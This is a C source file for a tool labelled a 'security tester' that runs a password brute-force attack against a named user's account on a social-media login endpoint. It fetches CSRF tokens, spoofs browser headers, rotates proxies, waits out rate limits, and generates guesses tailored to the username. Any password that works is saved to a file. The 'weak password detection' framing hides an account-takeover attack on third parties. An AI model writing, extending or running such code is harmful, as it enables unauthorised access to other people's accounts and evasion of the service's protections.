#include "security_tester.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#define sleep(seconds) Sleep((seconds) * 1000)
#else
#include <unistd.h>
#endif

SecurityTester* security_tester_init(void) {
    SecurityTester *tester = (SecurityTester*)malloc(sizeof(SecurityTester));
    if (!tester) return NULL;
    
    tester->logger = logger_init("SecurityTester", NULL);
    tester->generator = ai_generator_init();
    tester->csrf_mgr = csrf_manager_init(NULL, 10);
    tester->monitor = monitor_init();
    tester->request_mgr = request_manager_init(1.0, 3.0);
    tester->attempts = 0;
    tester->start_time = 0;
    tester->found_password[0] = '\0';
    tester->success = 0;
    
    return tester;
}

void security_tester_free(SecurityTester *tester) {
    if (tester) {
        if (tester->logger) logger_free(tester->logger);
        if (tester->generator) ai_generator_free(tester->generator);
        if (tester->csrf_mgr) csrf_manager_free(tester->csrf_mgr);
        if (tester->monitor) monitor_free(tester->monitor);
        if (tester->request_mgr) request_manager_free(tester->request_mgr);
        free(tester);
    }
}

static char* encode_password(const char *password) {
    static char encoded[512];
    time_t now = time(NULL);
    snprintf(encoded, sizeof(encoded), "#PWD_SNAPCHAT_BROWSER:0:%ld:%s", now, password);
    return encoded;
}

int security_tester_test_credentials(SecurityTester *tester, const char *username,
                                      const char *password, const char *proxy) {
    char *csrf_token = csrf_manager_get_token(tester->csrf_mgr,
                                               proxy != NULL, proxy);
    if (!csrf_token) {
        logger_error(tester->logger, "Failed to get CSRF token");
        return 0;
    }
    
    HTTPRequest request = {0};
    strncpy(request.url, SNAPCHAT_LOGIN_URL, sizeof(request.url) - 1);
    request.header_count = 4;
    snprintf(request.headers[0], sizeof(request.headers[0]),
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    snprintf(request.headers[1], sizeof(request.headers[1]),
             "X-CSRFToken: %s", csrf_token);
    strncpy(request.headers[2], "X-Requested-With: XMLHttpRequest", sizeof(request.headers[2]) - 1);
    strncpy(request.headers[3], "Content-Type: application/x-www-form-urlencoded", sizeof(request.headers[3]) - 1);
    
    char *encoded_pass = encode_password(password);
    snprintf(request.data, sizeof(request.data),
             "username=%s&enc_password=%s&queryParams={}&optIntoOneTap=false",
             username, encoded_pass);
    
    if (proxy && strlen(proxy) > 0) {
        request_manager_set_proxy(tester->request_mgr, proxy);
    }
    
    HTTPResponse *response = request_manager_send(tester->request_mgr, &request);
    
    int authenticated = 0;
    if (response) {
        if (response->status_code == 429) {
            logger_warn(tester->logger, "Rate limited - adapting strategy...");
            sleep(60);
        } else if (strstr(response->body, "authenticated\": true") ||
                   strstr(response->body, "authenticated\":true")) {
            authenticated = 1;
            printf("WEAK PASSWORD DETECTED: %s\n", password);
            strncpy(tester->found_password, password, MAX_PASSWORD_LENGTH - 1);
            tester->found_password[MAX_PASSWORD_LENGTH - 1] = '\0';
        } else {
            printf("Attempt %d: %s - Failed\n", tester->attempts + 1, password);
        }
        
        tester->attempts++;
        free(response);
    }
    
    monitor_log_request(tester->monitor, authenticated);
    return authenticated;
}

AttackResult security_tester_conduct_test(SecurityTester *tester, const char *username,
                                           char **password_list, int password_count,
                                           double delay, int use_proxy, const char *proxy) {
    AttackResult result = {0};
    result.success = 0;
    strcpy(result.password, "");
    result.attempts = 0;
    result.duration = 0;
    
    tester->start_time = time(NULL);
    
    printf("\n========================================\n");
    printf("  STARTING AI-POWERED SECURITY ASSESSMENT\n");
    printf("========================================\n");
    printf("Target: %s\n", username);
    printf("Method: Machine Learning Password Generation\n");
    printf("Techniques: Pattern Recognition, Context Awareness\n");
    printf("========================================\n\n");
    
    monitor_start(tester->monitor);
    
    char **previous_attempts = NULL;
    int prev_count = 0;
    int max_prev = 1000;
    
    previous_attempts = (char**)malloc(sizeof(char*) * max_prev);
    
    for (int i = 0; i < password_count && i < MAX_ATTEMPTS; i++) {
        if (tester->success) break;
        
        char *password;
        const char *strategy;
        
        if (password_list && password_count > 0) {
            password = password_list[i];
            strategy = "Dictionary";
        } else if (i < 100) {
            password = generate_context_aware_password(tester->generator, username, i);
            strategy = "Context-Aware";
        } else if (i < 300) {
            password = generate_advanced_ai_password(tester->generator, username,
                                                       previous_attempts, prev_count);
            strategy = "AI with Feedback";
        } else {
            NeuralWeights weights = predict_next_password_type(previous_attempts, prev_count);
            password = generate_neural_password(&weights, tester->generator, username);
            strategy = "Neural Network";
        }
        
        if (i % 50 == 0) {
            printf("AI Progress: %d/%d attempts | Strategy: %s\n", i,
                   password_count > 0 ? password_count : MAX_ATTEMPTS, strategy);
        }
        
        if (security_tester_test_credentials(tester, username, password, proxy)) {
            tester->success = 1;
            result.success = 1;
            strncpy(result.password, password, MAX_PASSWORD_LENGTH - 1);
            result.password[MAX_PASSWORD_LENGTH - 1] = '\0';
            break;
        }
        
        if (prev_count < max_prev) {
            previous_attempts[prev_count] = strdup(password);
            prev_count++;
        }
        
        double ai_delay = calculate_ai_delay(i, delay);
        sleep((int)ai_delay);
    }
    
    for (int i = 0; i < prev_count; i++) {
        free(previous_attempts[i]);
    }
    free(previous_attempts);
    
    monitor_stop(tester->monitor);
    
    result.attempts = tester->attempts;
    result.duration = difftime(time(NULL), tester->start_time);
    
    if (!result.success) {
        printf("\nAI assessment complete - No weak passwords detected\n");
        printf("Analyzed %d password patterns\n", prev_count);
    }
    
    return result;
}

void security_tester_save_results(SecurityTester *tester, const char *output_file,
                                   AttackResult *result, const char *username) {
    (void)tester;
    FILE *f = fopen(output_file, "w");
    if (!f) {
        printf("Failed to save results to %s\n", output_file);
        return;
    }
    
    if (result->success) {
        fprintf(f, "SECURITY ALERT: Weak password detected\n");
        fprintf(f, "Username: %s\n", username);
        fprintf(f, "Password: %s\n", result->password);
        fprintf(f, "Attempts: %d\n", result->attempts);
        fprintf(f, "Duration: %.2fs\n", result->duration);
    } else {
        fprintf(f, "SECURITY ASSESSMENT COMPLETE\n");
        fprintf(f, "Username: %s\n", username);
        fprintf(f, "Result: No weak passwords detected\n");
        fprintf(f, "Tests conducted: %d\n", result->attempts);
        fprintf(f, "Duration: %.2fs\n", result->duration);
    }
    
    fclose(f);
    printf("Results saved to %s\n", output_file);
}
